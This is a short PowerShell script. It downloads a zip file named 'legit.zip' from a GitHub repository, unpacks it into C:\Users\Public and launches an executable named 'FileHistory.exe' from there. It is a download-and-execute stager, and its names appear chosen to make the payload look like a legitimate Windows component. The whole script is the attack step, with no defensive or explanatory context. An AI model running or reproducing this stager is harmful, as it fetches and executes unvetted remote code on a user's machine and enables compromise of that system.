# Download the zip file
(New-Object Net.WebClient).DownloadFile('https://github.com/SudoRM7748/RetDLL/raw/main/legit.zip', 'C:\Users\Public\powershell.zip')
# Expand the zip file
Expand-Archive -Path 'C:\Users\Public\powershell.zip' -DestinationPath 'C:\Users\Public\'
# Start the executable
Start-Process 'C:\Users\Public\FileHistory.exe'